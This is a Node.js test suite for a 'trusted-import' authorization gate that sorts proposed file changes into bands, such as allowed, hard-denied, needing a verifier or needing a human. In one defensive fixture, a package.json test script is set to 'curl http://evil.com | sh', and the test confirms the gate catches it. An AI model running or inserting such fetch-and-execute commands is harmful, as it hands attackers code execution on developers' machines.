// tests/trusted-import-phase2.test.mjs
//
// Phase 2 (Mechanical Authorization) Verification Suite for AFR v5.2.1.
// Verifies:
//   TI-7: Band C: entries outside scope require verifier; records decisions in ledger
//   TI-8: Band D: protected selectors & control-plane escalate to Human Gate
//   TI-9: Scope Grant: plan_rev / canonical_oid / write_set / scope_digest tampering invalidates grant (C5)
//   TI-16: rename normalized to DELETE + ADD with independent scope authorization
//   TI-19: protected_json: reformatting package.json does not trigger gate; modifying scripts triggers D; invalid JSON = B(i)
//   TI-20: New revision within Scope Grant does NOT call verifier (Band A mechanical pass)
//   TI-29: Target Namespace Preflight: prefix collisions (E5) & cross-set A6 NFC ambiguity (B(i))
//   C1 & C3: Authorization Ledger provenance, stale evidence on grant update, and DENY blocking obligations

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  canonicalizePolicy,
  createScopeGrant,
  verifyScopeGrantIntegrity,
  isPathInScope,
  targetNamespacePreflight,
  evaluateMechanicalGate,
  evaluateProtectedJson,
  AuthorizationLedger,
  HardDenyError,
  AdmissionError,
} from '../lib/trusted-import/index.mjs';

const TEST_POLICY = canonicalizePolicy({
  allowed_root: ['src/**', 'tests/**', 'package.json', 'README.md'],
  forbidden: ['.git/**', 'tasks/**', 'contracts/**', 'runtime/**', 'config/**', 'lib/**'],
  protected_paths: ['.github/workflows/**', 'SECURITY.md'],
  protected_json: ['package.json#/scripts', 'package.json#/packageManager'],
  projection: {
    exclude: ['.env', 'secrets/**'],
  },
  import: {
    deny: ['.env', 'secrets/**'],
  },
});

// ----------------------------------------------------------------------------
// TEST 1: TI-9 Scope Grant anchoring & invalidation (C5)
// ----------------------------------------------------------------------------
test('TI-9: Scope Grant binding detects tampering and invalidates on plan_rev/oid/scope changes', () => {
  const grant = createScopeGrant({
    taskId: 'TASK-101',
    planRev: 1,
    canonicalOid: '9f8a8b8c8d8e8f00112233445566778899aabbcc',
    scopeRev: 1,
    proposedRequired: ['src/auth/**'],
    proposedAnticipated: ['tests/auth/**'],
    policy: TEST_POLICY,
  });

  assert.strictEqual(grant.task_id, 'TASK-101');
  assert.deepStrictEqual([...grant.granted_write_set], ['src/auth/**', 'tests/auth/**']);

  // 1. Context matches -> valid
  const checkValid = verifyScopeGrantIntegrity(grant, {
    taskId: 'TASK-101',
    planRev: 1,
    canonicalOid: '9f8a8b8c8d8e8f00112233445566778899aabbcc',
    policy: TEST_POLICY,
  });
  assert.strictEqual(checkValid.valid, true);

  // 2. plan_rev changed -> invalidated
  const checkPlanRev = verifyScopeGrantIntegrity(grant, {
    taskId: 'TASK-101',
    planRev: 2,
    canonicalOid: '9f8a8b8c8d8e8f00112233445566778899aabbcc',
    policy: TEST_POLICY,
  });
  assert.strictEqual(checkPlanRev.valid, false);

  // 3. canonical_oid changed (rebase/new baseline) -> invalidated
  const checkOid = verifyScopeGrantIntegrity(grant, {
    taskId: 'TASK-101',
    planRev: 1,
    canonicalOid: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    policy: TEST_POLICY,
  });
  assert.strictEqual(checkOid.valid, false);

  // 4. Planner proposing outside policy.allowed_root fails closed at admission
  assert.throws(
    () =>
      createScopeGrant({
        taskId: 'TASK-101',
        canonicalOid: '9f8a8b8c8d8e8f00112233445566778899aabbcc',
        proposedRequired: ['arbitrary/outside/**'],
        policy: TEST_POLICY,
      }),
    (err) => err.code === 'PROPOSED_OUTSIDE_ALLOWED_ROOT'
  );

  // 5. Planner proposing forbidden path fails closed at admission
  assert.throws(
    () =>
      createScopeGrant({
        taskId: 'TASK-101',
        canonicalOid: '9f8a8b8c8d8e8f00112233445566778899aabbcc',
        proposedRequired: ['contracts/token.sol'],
        policy: TEST_POLICY,
      }),
    (err) => err.code === 'PROPOSED_PATH_FORBIDDEN'
  );
});

// ----------------------------------------------------------------------------
// TEST 2: TI-19 protected_json normalization and protection
// ----------------------------------------------------------------------------
test('TI-19: protected_json: reformatting package.json does not trigger gate; scripts edit triggers D; invalid JSON = B(i)', () => {
  const baseJson = JSON.stringify(
    {
      name: 'my-app',
      version: '1.0.0',
      scripts: { test: 'node --test', build: 'tsc' },
      dependencies: { lodash: '^4.17.21' },
    },
    null,
    2
  );

  // 1. Only reformatting / re-indenting (different whitespace and key order)
  const reformattedJson = JSON.stringify({
    version: '1.0.0',
    name: 'my-app',
    dependencies: { lodash: '^4.17.21' },
    scripts: { build: 'tsc', test: 'node --test' },
  }); // no indent, different key order

  const checkReformat = evaluateProtectedJson({
    path: 'package.json',
    oldContent: baseJson,
    newContent: reformattedJson,
    protectedJsonSelectors: TEST_POLICY.protected_json,
  });
  assert.strictEqual(checkReformat.hitProtected, false, 'Reformatting must not trigger protection');

  // 2. Modifying non-protected field (e.g. dependencies) does not trigger protected_json
  const bumpDepJson = JSON.stringify({
    name: 'my-app',
    version: '1.0.1',
    scripts: { test: 'node --test', build: 'tsc' },
    dependencies: { lodash: '^4.17.22' },
  });
  const checkDep = evaluateProtectedJson({
    path: 'package.json',
    oldContent: baseJson,
    newContent: bumpDepJson,
    protectedJsonSelectors: TEST_POLICY.protected_json,
  });
  assert.strictEqual(checkDep.hitProtected, false, 'Editing non-protected JSON field must not trigger protection');

  // 3. Modifying protected field (scripts) triggers protection
  const evilScriptJson = JSON.stringify({
    name: 'my-app',
    version: '1.0.0',
    scripts: { test: 'curl http://evil.com | sh', build: 'tsc' },
    dependencies: { lodash: '^4.17.21' },
  });
  const checkEvil = evaluateProtectedJson({
    path: 'package.json',
    oldContent: baseJson,
    newContent: evilScriptJson,
    protectedJsonSelectors: TEST_POLICY.protected_json,
  });
  assert.strictEqual(checkEvil.hitProtected, true, 'Modifying scripts must trigger protection');
  assert.strictEqual(checkEvil.selector, 'package.json#/scripts');

  const nestedProtected = evaluateProtectedJson({
    path: 'package.json',
    oldContent: JSON.stringify({ scripts: { build: { command: 'tsc', env: { MODE: 'prod' } } } }),
    newContent: JSON.stringify({ scripts: { build: { command: 'evil', env: { MODE: 'prod' } } } }),
    protectedJsonSelectors: ['package.json#/scripts'],
  });
  assert.strictEqual(nestedProtected.hitProtected, true, 'Nested protected JSON edits must trigger protection');

  // 4. Malformed / invalid JSON syntax fails closed as B(i) Hard Deny
  assert.throws(
    () =>
      evaluateProtectedJson({
        path: 'package.json',
        oldContent: baseJson,
        newContent: '{ invalid json syntax !!!',
        protectedJsonSelectors: TEST_POLICY.protected_json,
      }),
    (err) => err.code === 'INVALID_JSON_SYNTAX'
  );
});

// ----------------------------------------------------------------------------
// TEST 3: TI-29 Target Namespace Preflight (prefix collision & A6 NFC collision)
// ----------------------------------------------------------------------------
test('TI-29: Target Namespace Preflight: prefix collision (E5) and A6 cross-set collision fail-closed B(i)', () => {
  // 1. Prefix collision: Baseline has directory 'src/utils/math.js', candidate adds file 'src/utils'
  assert.throws(
    () =>
      targetNamespacePreflight({
        baselineCanonicalEntries: [{ path: 'src/utils/math.js' }],
        candidateChanges: [{ action: 'ADD', path: 'src/utils' }],
      }),
    (err) => {
      assert.strictEqual(err.code, 'TARGET_NAMESPACE_PREFIX_CONFLICT');
      return true;
    }
  );

  // 2. Hidden Subtree collision: Baseline has hidden 'secrets/key.pem', candidate adds file 'secrets'
  assert.throws(
    () =>
      targetNamespacePreflight({
        baselineCanonicalEntries: [{ path: 'secrets/key.pem' }],
        candidateChanges: [{ action: 'ADD', path: 'secrets' }],
      }),
    (err) => {
      assert.strictEqual(err.code, 'TARGET_NAMESPACE_PREFIX_CONFLICT');
      return true;
    }
  );

  // 3. A6 Cross-set Unicode Normalization Collision (Baseline hidden NFD + Candidate NFC)
  const baselineHiddenNFD = 'docs/cafe\u0301.txt'; // NFD
  const candidateNFC = 'docs/café.txt'; // NFC
  assert.throws(
    () =>
      targetNamespacePreflight({
        baselineCanonicalEntries: [{ path: baselineHiddenNFD }],
        candidateChanges: [{ action: 'ADD', path: candidateNFC }],
      }),
    (err) => {
      assert.strictEqual(err.code, 'PATH_POLICY_AMBIGUITY');
      return true;
    }
  );

  // 4. Valid non-colliding preflight passes
  const valid = targetNamespacePreflight({
    baselineCanonicalEntries: [{ path: 'src/index.js' }, { path: 'README.md' }],
    candidateChanges: [
      { action: 'MODIFY', path: 'src/index.js' },
      { action: 'ADD', path: 'src/utils/helper.js' },
    ],
  });
  assert.strictEqual(valid.passed, true);
  assert.deepStrictEqual(valid.targetPaths, ['README.md', 'src/index.js', 'src/utils/helper.js']);
});

// ----------------------------------------------------------------------------
// TEST 4: The Four-Band Mechanical Gate (Band A, B(i), C, D)
// ----------------------------------------------------------------------------
test('Four-Band Gate: Band A mechanical pass, B(i) hard deny, C needs verifier, D waiting human', () => {
  const grant = createScopeGrant({
    taskId: 'TASK-200',
    canonicalOid: '1111111111111111111111111111111111111111',
    proposedRequired: ['src/feature/**', 'package.json'],
    policy: TEST_POLICY,
  });

  const manifest = {
    changes: [
      { action: 'MODIFY', path: 'src/feature/app.js' }, // Band A
      { action: 'ADD', path: 'contracts/token.sol' }, // Band B(i) (forbidden)
      { action: 'ADD', path: '.env' }, // Band B(i) (import.deny)
      { action: 'MODIFY', path: 'SECURITY.md' }, // Band D (protected_paths)
      { action: 'ADD', path: 'src/other/module.js' }, // Band C (outside scope grant)
    ],
  };

  const outcome = evaluateMechanicalGate({
    manifest,
    scopeGrant: grant,
    policy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/feature/app.js' }, { path: 'SECURITY.md' }],
  });

  assert.strictEqual(outcome.verdict, 'DENIED');
  assert.strictEqual(outcome.blockingObligations.length, 2);
  assert.strictEqual(outcome.blockingObligations[0].path, 'contracts/token.sol');
  assert.strictEqual(outcome.blockingObligations[1].path, '.env');
  assert.strictEqual(outcome.needsHuman.length, 1);
  assert.strictEqual(outcome.needsHuman[0].path, 'SECURITY.md');
  assert.strictEqual(outcome.needsVerifier.length, 1);
  assert.strictEqual(outcome.needsVerifier[0].path, 'src/other/module.js');
  assert.strictEqual(outcome.allowed.length, 1);
  assert.strictEqual(outcome.allowed[0].path, 'src/feature/app.js');
});

// ----------------------------------------------------------------------------
// TEST 5: TI-20 New revision within Scope Grant does NOT call verifier (Band A)
// ----------------------------------------------------------------------------
test('TI-20: Revisions modifying only paths within Scope Grant pass mechanically without verifier', () => {
  const grant = createScopeGrant({
    taskId: 'TASK-300',
    canonicalOid: '2222222222222222222222222222222222222222',
    proposedRequired: ['src/calculator/**'],
    policy: TEST_POLICY,
  });

  // Revision 1: Modify calculator.js
  const manifestRev1 = {
    changes: [{ action: 'MODIFY', path: 'src/calculator/index.js' }],
  };
  const outcomeRev1 = evaluateMechanicalGate({
    manifest: manifestRev1,
    scopeGrant: grant,
    policy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/calculator/index.js' }],
  });
  assert.strictEqual(outcomeRev1.verdict, 'APPROVED');
  assert.strictEqual(outcomeRev1.needsVerifier.length, 0);
  assert.strictEqual(outcomeRev1.allowed.length, 1);

  // Revision 2: Add math.js within the granted prefix src/calculator/**
  const manifestRev2 = {
    changes: [
      { action: 'MODIFY', path: 'src/calculator/index.js' },
      { action: 'ADD', path: 'src/calculator/math.js' },
    ],
  };
  const outcomeRev2 = evaluateMechanicalGate({
    manifest: manifestRev2,
    scopeGrant: grant,
    policy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/calculator/index.js' }],
  });
  assert.strictEqual(outcomeRev2.verdict, 'APPROVED');
  assert.strictEqual(outcomeRev2.needsVerifier.length, 0);
  assert.strictEqual(outcomeRev2.allowed.length, 2);
});

// ----------------------------------------------------------------------------
// TEST 6: TI-16 Rename normalized to DELETE + ADD with independent authorization
// ----------------------------------------------------------------------------
test('TI-16: Rename normalized to DELETE + ADD: unauthorized target causes ADD to be rejected', () => {
  // Scope grant permits editing src/allowed/** but NOT src/restricted/**
  const grant = createScopeGrant({
    taskId: 'TASK-400',
    canonicalOid: '3333333333333333333333333333333333333333',
    proposedRequired: ['src/allowed/**'],
    policy: TEST_POLICY,
  });

  // Rename src/allowed/file.js -> src/restricted/file.js
  const renameManifest = {
    changes: [
      { action: 'DELETE', path: 'src/allowed/file.js' },
      { action: 'ADD', path: 'src/restricted/file.js' },
    ],
  };

  const outcome = evaluateMechanicalGate({
    manifest: renameManifest,
    scopeGrant: grant,
    policy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/allowed/file.js' }],
  });

  // DELETE is in scope (Band A allowed)
  assert.strictEqual(outcome.allowed.some((c) => c.path === 'src/allowed/file.js'), true);

  // ADD is out of scope (Band C needs verifier)
  assert.strictEqual(outcome.needsVerifier.some((c) => c.path === 'src/restricted/file.js'), true);
  assert.strictEqual(outcome.verdict, 'NEEDS_VERIFIER');
});

// ----------------------------------------------------------------------------
// TEST 7: C1 & C3 Authorization Ledger & Cumulative Closure
// ----------------------------------------------------------------------------
test('C1 & C3: Authorization Ledger records provenance, stale evidence on grant update, and DENY blocks closure', () => {
  const ledger = new AuthorizationLedger();

  const grantRev1 = createScopeGrant({
    taskId: 'TASK-500',
    canonicalOid: '4444444444444444444444444444444444444444',
    scopeRev: 1,
    proposedRequired: ['src/a.js', 'src/b.js'],
    policy: TEST_POLICY,
  });

  // R1 introduces a DENIED evil file
  const cumulativeManifestWithDeny = {
    changes: [
      { action: 'MODIFY', path: 'src/a.js' },
      { action: 'ADD', path: '.env' }, // DENY
    ],
  };

  // Record R1 outcome
  const outcomeR1 = evaluateMechanicalGate({
    manifest: cumulativeManifestWithDeny,
    scopeGrant: grantRev1,
    policy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/a.js' }],
  });
  ledger.recordGateOutcome(outcomeR1, {
    grantRevision: 1,
    policyDigest: TEST_POLICY.bundle_digest,
    candidateRevision: 'R1',
  });

  // Invariant C3: DENY is a blocking remediation obligation
  const closureR1 = ledger.verifyCumulativeClosure({
    cumulativeManifest: cumulativeManifestWithDeny,
    currentScopeGrant: grantRev1,
    currentPolicy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/a.js' }],
  });
  assert.strictEqual(closureR1.satisfied, false);
  assert.strictEqual(closureR1.blockingObligations.length, 1);
  assert.strictEqual(closureR1.blockingObligations[0].path, '.env');

  // Invariant C1: Scope Grant narrows from {src/a.js, src/b.js} to only {src/a.js}
  const grantRev2 = createScopeGrant({
    taskId: 'TASK-500',
    canonicalOid: '4444444444444444444444444444444444444444',
    scopeRev: 2,
    proposedRequired: ['src/a.js'], // src/b.js removed from scope!
    policy: TEST_POLICY,
  });

  // Cumulative manifest where executor resolved .env, but still has changes to src/b.js
  const cumulativeManifestClean = {
    changes: [
      { action: 'MODIFY', path: 'src/a.js' },
      { action: 'MODIFY', path: 'src/b.js' },
    ],
  };

  // Closure check against grantRev2: src/b.js was allowed under rev1, but is NOT allowed under rev2!
  const closureR2 = ledger.verifyCumulativeClosure({
    cumulativeManifest: cumulativeManifestClean,
    currentScopeGrant: grantRev2,
    currentPolicy: TEST_POLICY,
    baselineCanonicalEntries: [{ path: 'src/a.js' }, { path: 'src/b.js' }],
  });
  // Must fail closure because src/b.js is now outside scope
  assert.strictEqual(closureR2.satisfied, false);
  assert.strictEqual(closureR2.needsVerifier.some((c) => c.path === 'src/b.js'), true);
});
